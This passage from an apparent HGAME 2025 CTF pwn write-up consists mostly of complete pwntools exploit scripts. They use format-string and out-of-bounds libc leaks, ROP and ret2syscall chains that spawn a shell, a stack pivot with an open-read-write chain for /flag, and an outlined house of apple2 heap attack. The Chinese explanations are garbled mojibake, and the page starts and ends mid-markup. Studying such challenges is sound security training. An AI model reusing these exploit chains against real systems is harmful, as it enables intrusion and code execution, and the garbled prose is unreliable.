class="line"></span><br><span class="line">rl(&quot; n = &quot;)</span><br><span class="line">#bug()</span><br><span class="line">s(str(-1))</span><br><span class="line">sleep(0.01)</span><br><span class="line">payload=b&#x27;a&#x27;*(0xc+1)+p64(rdi)+p64(bin_sh)+p64(rdi+1)+p64(system)</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><p>æ–¹æ³•äºŒ</p><p>å¯ä»¥ç›´æ¥ç”¨æ ˆæº¢å‡ºåšï¼Œè¿™é‡Œä¸»è¦åˆ©ç”¨printfçš„gadget</p><p>æˆ‘ä»¬éœ€è¦åšå‡ºåˆç†çš„æ ˆå¸ƒå±€</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739964871396-afce93c2-37bd-4e32-b4b0-77ff33b4f3bf.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=b&#x27;a&#x27;*0x5+p64(stack)+p64(0x4012CF)+p64(1)+b&#x27;%29$p\x0011&#x27;+p64(1)+p64(0)+p64(0x000000000040119d)+p64(stack+0x24)+p64(0x4011D9)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739965269125-67373558-814e-4da6-a546-2d7e917e7e5e.png" alt=""></p><p>å¯ä»¥æ³„éœ²å‡ºlibcåœ°å€ï¼Œåç»­èµ°systemçš„ropé“¾ä¼šå¡æ ˆï¼Œéœ€è¦ç”¨ret2syscallæ‰“system</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*  </span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">p=process(&#x27;./pwn&#x27;) </span><br><span class="line">#p=remote(&#x27;&#x27;,)</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">def s(a):</span><br><span class="line">    p.send(a)</span><br><span class="line">def sa(a, b):</span><br><span class="line">    p.sendafter(a, b)</span><br><span class="line">def sl(a):</span><br><span class="line">    p.sendline(a)</span><br><span class="line">def sla(a, b):</span><br><span class="line">    p.sendlineafter(a, b)   </span><br><span class="line">def li(a):</span><br><span class="line">    print(hex(a))     </span><br><span class="line">def r():</span><br><span class="line">    p.recv()</span><br><span class="line">def pr():</span><br><span class="line">    print(p.recv())</span><br><span class="line">def rl(a):</span><br><span class="line">    return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">    p.interactive()</span><br><span class="line">def get_32():</span><br><span class="line">    return u32(p.recvuntil(b&#x27;\xf7&#x27;)[-4:])    </span><br><span class="line">def get_addr():</span><br><span class="line">    return u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">def get_sb():</span><br><span class="line">    return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))    </span><br><span class="line">def bug():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">rl(b&#x27;you have n chance to getshell&#x27;)</span><br><span class="line">sl(str(1))</span><br><span class="line">rl(b&#x27;type something:&#x27;)</span><br><span class="line">sl(b&#x27;%p&#x27;)</span><br><span class="line">rl(b&#x27;you type: &#x27;)</span><br><span class="line">stack=int(p.recv(14),16)+8480+16+0x10-8</span><br><span class="line">li(stack)</span><br><span class="line">rl(b&#x27; n = &#x27;)</span><br><span class="line"></span><br><span class="line">sl(b&#x27;-1&#x27;)</span><br><span class="line"></span><br><span class="line">pay=b&#x27;a&#x27;*0x5+p64(stack)+p64(0x4012CF)+p64(1)+b&#x27;%29$p\x0011&#x27;+p64(1)+p64(0)+p64(0x000000000040119d)+p64(stack+0x24)+p64(0x4011D9)</span><br><span class="line">bug()</span><br><span class="line">s(pay)</span><br><span class="line"></span><br><span class="line">rl(b&#x27;type something:&#x27;)</span><br><span class="line">libc_base=int(p.recv(14),16)-0x29e40</span><br><span class="line">li(libc_base)</span><br><span class="line"></span><br><span class="line">rax = libc_base+libc.search(asm(&quot;pop rax\nret&quot;)).__next__()</span><br><span class="line">rsi = libc_base+libc.search(asm(&quot;pop rsi\nret&quot;)).__next__()</span><br><span class="line">rdx = libc_base+0x000000000011f2e7</span><br><span class="line">syscall=libc_base+libc.search(asm(&quot;syscall\nret&quot;)).__next__()</span><br><span class="line">rdi = libc_base+libc.search(asm(&quot;pop rdi\nret&quot;)).__next__()</span><br><span class="line">system,bin=get_sb()</span><br><span class="line"></span><br><span class="line">pay=b&#x27;a&#x27;*0xc+p64(rdi)+p64(bin)+p64(rax)+p64(0x3b)+p64(rsi)+p64(0)+p64(rdx)+p64(0)*2+p64(syscall)</span><br><span class="line">s(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h4 id="counting-petals">counting petals</h4><p>æ•°ç»„è¶Šç•Œï¼Œv7æœ€åä¸€ä¸ªè¶Šç•Œåˆ°v8ï¼Œv9ï¼Œæˆ‘ä»¬å¯ä»¥ä»»æ„è¶Šç•Œå†™ï¼Œåè¾¹æ‰“å°ä¹Ÿä¼šå¤–å¸¦å‡ºlibcåœ°å€ï¼Œå¹¶ä¸”ä¸æ˜¯å¶æ•°æœ‰ä¸¤æ¬¡æœºä¼šï¼Œç¬¬ä¸€æ¬¡åˆ©ç”¨æ•°ç»„è¶Šç•Œæ³„éœ²libcåœ°å€ï¼Œç¬¬äºŒæ¬¡èµ°ropé“¾å­</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739888949445-d5360704-206f-42d7-b996-ce627203bcce.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)   </span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">p=remote(&#x27;node1.hgame.vidar.club&#x27;,30656)</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">rl(&quot;\nHow many flowers have you prepared this time?&quot;)</span><br><span class="line">sl(str(16))</span><br><span class="line"></span><br><span class="line">rl(&quot;\nTell me the number of petals in each flower.&quot;)</span><br><span class="line">for i in range(14):</span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">sl(str(i+1))</span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">#bug()</span><br><span class="line">sl(str(15))</span><br><span class="line"></span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">#bug()</span><br><span class="line">sl(str(0x0000001000000015))</span><br><span class="line">for i in range(5):</span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">sl(b&#x27;-&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rl(&quot;Reply 1 indicates the former and 2 indicates the latter: &quot;)</span><br><span class="line">sl(str(1))</span><br><span class="line"></span><br><span class="line">for i in range(18):</span><br><span class="line">rl(&quot; + &quot;)</span><br><span class="line"></span><br><span class="line">libc_base=int(p.recv(15),10)-171408</span><br><span class="line">li(hex(libc_base))</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">rdi = libc_base+libc.search(asm(&quot;pop rdi\nret&quot;)).__next__()</span><br><span class="line"></span><br><span class="line">rl(&quot;\nHow many flowers have you prepared this time?&quot;)</span><br><span class="line">sl(str(16))</span><br><span class="line"></span><br><span class="line">rl(&quot;\nTell me the number of petals in each flower.&quot;)</span><br><span class="line">for i in range(14):</span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">sl(str(i+1))</span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">#bug()</span><br><span class="line">sl(str(15))</span><br><span class="line"></span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">#bug()</span><br><span class="line">sl(str(0x0000001000000016))</span><br><span class="line">for i in range(2):</span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">sl(b&#x27;-&#x27;)</span><br><span class="line"></span><br><span class="line">def pay(a):</span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">sl(str(a))</span><br><span class="line">pay(rdi)</span><br><span class="line">pay(bin_sh)</span><br><span class="line">pay(rdi+1)</span><br><span class="line">pay(system)</span><br><span class="line"></span><br><span class="line">rl(&quot;Reply 1 indicates the former and 2 indicates the latter: &quot;)</span><br><span class="line">sl(str(1))</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h4 id="ezstack">ezstack</h4><p>webpwn</p><p>ä¸»ä½“å°±æ˜¯ä¸€ä¸ªæ ˆè¿ç§»ï¼Œæœ‰0x10å­—èŠ‚æº¢å‡ºï¼Œå¹¶ä¸”å¼€å¯æ²™ç›’</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739889189440-8b981794-ea80-4176-a01d-dca3ff45e009.png" alt=""></p><p>è¿™é‡Œç»™å‡ºgiftï¼Œè·Ÿæ­£å¸¸ç›¸æ¯”çš„å°±æ˜¯fdä½æ˜¯4ï¼Œæœ€åorwçš„å‚æ•°åˆ†åˆ«æ˜¯0ï¼Œ5ï¼Œ4</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739889244487-ae479c2e-1268-4f62-a019-6f16b041373e.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line">#p=remote(&#x27;127.0.0.1&#x27;,9999)</span><br><span class="line">p=remote(&#x27;node1.hgame.vidar.club&#x27;,31421)</span><br><span class="line">rdi=0x0000000000401713</span><br><span class="line">rsi_r15=0x0000000000401711</span><br><span class="line">bss=0x404154</span><br><span class="line">read=0x40140F</span><br><span class="line">leave_ret=0x401426</span><br><span class="line">rbp=0x000000000040135d</span><br><span class="line"></span><br><span class="line">rl(&quot;Good luck.\n&quot;)</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*(0x50)+p64(bss)+p64(read)</span><br><span class="line">#bug()</span><br><span class="line">s(payload)</span><br><span class="line">sleep(0.01)</span><br><span class="line">pay2 =(p64(rsi_r15)+p64(elf.got[&#x27;read&#x27;])*2+p64(elf.plt[&#x27;write&#x27;])+p64(0x4013D2)).ljust(0x50,b&#x27;\x00&#x27;)</span><br><span class="line">pay2+=p64(0x404104-8)+p64(leave_ret)  </span><br><span class="line">#bug()</span><br><span class="line">s(pay2)</span><br><span class="line"></span><br><span class="line">libc_base=get_addr64()-libc.sym[&#x27;read&#x27;]</span><br><span class="line">li(hex(libc_base))</span><br><span class="line">rdi = libc_base+libc.search(asm(&quot;pop rdi\nret&quot;)).__next__()</span><br><span class="line">rsi = libc_base+libc.search(asm(&quot;pop rsi\nret&quot;)).__next__()</span><br><span class="line">rdx = libc_base+libc.search(asm(&quot;pop rdx\nret&quot;)).__next__()</span><br><span class="line">rdx_r12= libc_base+libc.search(asm(&quot;pop rdx\npop r12\nret&quot;)).__next__()</span><br><span class="line">rax = libc_base+libc.search(asm(&quot;pop rax\nret&quot;)).__next__()</span><br><span class="line">ret = libc_base+libc.search(asm(&quot;ret&quot;)).__next__()</span><br><span class="line">syscall=libc_base+libc.search(asm(&quot;syscall\nret&quot;)).__next__()</span><br><span class="line">open=libc_base+libc.sym[&#x27;open&#x27;]</span><br><span class="line">read=libc_base + libc.sym[&#x27;read&#x27;]</span><br><span class="line">write=libc_base + libc.sym[&#x27;write&#x27;]</span><br><span class="line">mprotect=libc_base + libc.sym[&#x27;mprotect&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rl(&quot;Good luck.\n&quot;)</span><br><span class="line">pay3=(p64(rsi)+p64(0x404530)+p64(rdx_r12)+p64(0x100)*2+p64(rax)+p64(0)+p64(syscall)+p64(0x4013D2)+b&#x27;/flag\x00\x00\x00&#x27;).ljust(0x50,b&#x27;\x00&#x27;)+p64(0x4040dc-8)+p64(leave_ret)</span><br><span class="line">#bug()</span><br><span class="line">s(pay3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(0.1)</span><br><span class="line">flag=0x404530</span><br><span class="line">stack=0x404130+0x500</span><br><span class="line">orw = b&#x27;/flag\x00\x00\x00&#x27;+p64(rdi) + p64(flag)  #/flagçš„å­—ç¬¦ä¸²ä½ç½®ï¼Œè¦æ”¹</span><br><span class="line">orw += p64(rsi) + p64(0)</span><br><span class="line">orw += p64(rax)+p64(2)+p64(syscall)</span><br><span class="line">orw += p64(rdi) + p64(5)</span><br><span class="line">orw += p64(rdx_r12) + p64(0x50)*2</span><br><span class="line">orw += p64(rsi)+p64(stack+0x200) #è¯»å…¥flagçš„ä½ç½®</span><br><span class="line">orw += p64(read)</span><br><span class="line">orw += p64(rdi) + p64(4)</span><br><span class="line">orw += p64(rdx_r12) + p64(0x50)*2</span><br><span class="line">orw += p64(rsi)+p64(stack+0x200) #è¯»å…¥flagçš„ä½ç½®</span><br><span class="line">orw += p64(write)</span><br><span class="line"></span><br><span class="line">sl(orw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(0.1)</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*(0x50)+p64(0x404530)+p64(leave_ret)</span><br><span class="line"></span><br><span class="line">#bug()</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">sleep(0.1)</span><br><span class="line"></span><br><span class="line">pay3=(p64(rsi)+p64(bss)+p64(rdx_r12)+p64(0x100)*2+p64(rax)+p64(0)+p64(syscall)+p64(bss)).ljust(0x50,b&#x27;\x00&#x27;)+p64(0x4040d4-8)+p64(leave_ret)</span><br><span class="line">bug()</span><br><span class="line">s(pay3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">flag=0x40420c</span><br><span class="line">stack=0x404130+0x500</span><br><span class="line">orw = p64(rdi) + p64(flag)  #/flagçš„å­—ç¬¦ä¸²ä½ç½®ï¼Œè¦æ”¹</span><br><span class="line">orw += p64(rsi) + p64(0)</span><br><span class="line">orw += p64(rax)+p64(2)+p64(syscall)</span><br><span class="line">orw += p64(rdi) + p64(3)</span><br><span class="line">orw += p64(rdx_r12) + p64(0x50)*2</span><br><span class="line">orw += p64(rsi)+p64(stack+0x200) #è¯»å…¥flagçš„ä½ç½®</span><br><span class="line">orw += p64(read)</span><br><span class="line">orw += p64(rdi) + p64(1)</span><br><span class="line">orw += p64(rdx_r12) + p64(0x50)*2</span><br><span class="line">orw += p64(rsi)+p64(stack+0x200) #è¯»å…¥flagçš„ä½ç½®</span><br><span class="line">orw += p64(write)+b&#x27;/flag\x00\x00\x00&#x27;</span><br><span class="line"></span><br><span class="line">sl(orw)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h3 id="week2">week2</h3><h4 id="Hit-list">Hit list</h4><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739885361131-33186b5c-db0e-40ce-9e3c-267086d332f2.png" alt=""></p><p>add</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739885486359-3b37c093-c360-4c0c-9ff7-7708bb2258df.png" alt=""></p><p>edit</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739885533118-d0e39e18-15e9-4447-b26a-898efb9b5992.png" alt=""></p><p>gift</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739885409779-7bcccd44-5ef0-48f8-a84e-ad64ab8650b3.png" alt=""></p><p>å…¸èœå•å †é¢˜ï¼Œæ¼æ´ç‚¹uaf</p><p>addé™åˆ¶å †å—å¤§å°&lt;=0x3f0ï¼Œè¿™æ ·å°±ä¸èƒ½è¿›è¡Œlargerbin attackäº†ï¼Œæ¯æ¬¡ç”³è¯·å †å—ä¼šç”³è¯·0x20çš„ä¿¡æ¯å †å—</p><p>åŒæ—¶ç»™å‡ºgiftï¼Œå¯ä»¥ä»»æ„åœ°å€freeï¼Œè§¦å‘æ¡ä»¶æ˜¯malloc(0)</p><p>editæ˜¯å…ˆå°†å †å—freeä¹‹ååˆ©ç”¨ç”³è¯·å †å—çš„éƒ¨åˆ†å°†å †å—å†æ¬¡ç”³è¯·å‡ºæ¥å†™å…¥</p><p>é¦–å…ˆå°±æ˜¯æ³„éœ²å †åœ°å€ï¼Œç”³è¯·ä¸¤ä¸ªå…±åŒå¤§å°çš„å †å—ï¼Œé‡Šæ”¾åç”³è¯·0x20å¤§å°çš„å †å—ï¼Œå°±å¯ä»¥å¾—åˆ°å †åœ°å€</p><p>å…¶æ¬¡æ˜¯æ³„éœ²libcåœ°å€ï¼Œé‡Šæ”¾å¤§äº0x88çš„å †å—ï¼Œå…ˆå°†tcachebinæ·»æ…¢ï¼Œä¸­é—´0x30çš„å †å—å¦‚æœæ»¡çš„è¯æ²¡åŠæ³•freeï¼Œæˆ‘ä»¬å¯ä»¥ç”³è¯·0x20çš„å †å—å†æ¬¡é‡Šæ”¾ï¼Œå°±å¯ä»¥æ‹¿åˆ°libcåœ°å€</p><p>æœ€åæˆ‘ä»¬ç”³è¯·ä¸€ä¸ªå¤§å †å—ï¼Œä¼ªé€ å¥½åˆé€‚çš„sizeï¼Œåˆ©ç”¨giftå°†ä¼ªé€ çš„å †å—é‡Šæ”¾ï¼Œä¹‹åeditå¤§å †å—å°±å¯ä»¥å®Œæˆtcachebin attackï¼Œæ”»å‡»IO_list_allï¼Œå†™å…¥æˆ‘ä»¬ä¼ªé€ fake_ioçš„å †åœ°å€ï¼Œèµ°house of apple2ï¼Œexité€€å‡ºè§¦å‘getshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 